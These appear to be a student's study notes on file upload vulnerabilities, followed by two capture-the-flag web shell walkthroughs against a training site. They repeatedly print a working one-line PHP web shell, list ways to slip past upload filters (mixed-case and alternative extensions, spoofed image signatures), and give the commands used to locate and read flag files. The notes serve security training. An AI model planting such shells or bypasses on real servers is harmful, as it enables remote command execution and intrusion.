# Web Shell
* A shell-like interface that enables a web server to be remotely accessed, often for the purposes of cyberattacks

## Part 1. Review
1. CSRF definition?
  - exploit a website's trust in a user's browser, allowing attackers to perform unauthorized actions on behalf of the authenticated user.
  - Attack scenarios = Link, XSS, iframe
  - Countermeasure = Referal check, Add identification information

2. File Upload
* Definition - when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size.
* Cause - When a file is uploaded, it doesn't check or authenticate
* Location - Any upload location (Chekcing through burp suite)

3. File upload vulnerability - Attack scenarios
* Unlimited = DoS Attack, Web Shell, Malware script, Back door, Ransomware
* Execution files on server side
   * Server-side script vs client-side script (XSS)
     - Server side script = php, asp, jsp, python, nodejs
* Phishing : HTML file
* Deface Attack
  - index file (covered)
* XSS - Stored XSS
* DoS

4. Detail of execution file on server side
- Web Shell
- php web shell
```php
<?php echo system$_GET['cmd']; ?>
```
5. Keypoint of Web Shell Attack
* Possibility of uploading web server code
* Path of the uploaded file
  - Path Check
  - Checking the output of the uploaded file
  - Copy image address

## Part 2. Countermeasure for file upload
1. Restriction of upload file
- vulnerability = content-type: text/php
2. Restriction of execution
- saving router = ../filename.php   (it will execute)
3. Restriction of extension
- Change capital => pHp Php
- Alternative extension => phtml, php3, php5  //  jspx, jsw
4. Normal image
 - hex editor
```php
<?php system($_GET['cmd']);?>
```
- File Signature
5. Execution code on the server side
- extension is supposed to be a web server extension
6. Caution when finding vulnerabilities in file upload
- Why using web shell = checking the execution of the upload file

## Part 3. CTF
* CTF - Webshell 1
1. Error - php file upload on the board and find flag.txt
2. Create a new hacking php file to upload

<?php echo system($_GET['cmd']); ?>

4. Create a new post and upload the hacking php file
5. Look at the post package through the burp suite and check the possibility
6. Copy the download link address on the new post
7. Check the link operation on the search bar with any command
```php
http://ctf.segfaulthub.com:8989/webshell_1/files/seungho/webshell.php?cmd=ls
```
8. Try different commend through the burp suite package repeater
9. Try attack commend to find the flag
```
find / -name flag.txt 2>/dev/null
find%20%2F%20-name%20flag.txt%202%3E%2Fdev%2Fnull
```
10. When finding the path, read the file
```
cat /app/webshell_1/important_data/flag.txt
cat%20/app/webshell_1/important_data/flag.txt
```

* CTF - Webshell 2
1. Error - find flag.txt file in the server
2. Create a new hacking php file to upload
3. Create a new post and upload the hacking php file
4. Found an alert of the extension limitation
5. Upload any image file to get a successful upload package
6. On the package, change the file name to webshell.php and attack content to add a "webshell.php" attack file
```php
<?php echo system($_GET['cmd']); ?>
```
7. Try to replace the extension such as a capital combination (e.g. php -> pHp) to create a new post
8. Look at the post package through the burp suite and check the confirmation
9. Find a new post to get the download link address
10. Copy the download link address on the new post
12.Check the list of uploaded files
```
http://ctf.segfaulthub.com:7979/webshell_2/files/seungho/
```
13. Check the link operation on the search bar with any command
```
http://ctf.segfaulthub.com:8989/webshell_1/files/seungho/webshell.php?cmd=ls
```
14. Try different commend through the burp suite package repeater
15. Try attack command to find the flag
```
find / -name flag.txt 2>/dev/null
find%20%2F%20-name%20flag.txt%202%3E%2Fdev%2Fnull
```
15. When finding the path, read the file
```
cat /app/webshell_2/secret_file/flag.txt
cat%20app/webshell_2/secret_file/flag.txt
```
